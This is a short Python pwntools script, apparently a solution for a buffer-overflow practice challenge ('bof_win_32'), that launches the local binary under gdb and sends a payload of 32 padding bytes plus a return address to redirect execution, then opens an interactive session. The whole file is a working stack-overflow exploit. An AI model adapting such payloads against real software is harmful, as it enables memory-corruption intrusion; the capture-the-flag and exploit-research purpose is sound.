from pwn import p64, u64, p32, u32
import pwn
import sys
        
pwn.context.log_level = "debug"
pwn.context.timeout = 20
p = pwn.process("/home/yuge/Documents/ACBEG/binaries/zeratool-challenges/overflow/bof_win_32")
pwn.gdb.attach(p)
payload = b""
payload += b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc6\x91\x04\x08\n'
p.send(payload)
p.recvuntil(b'pwn_me:\nYour buffer is at 0x7ffefefc\n')
p.interactive()
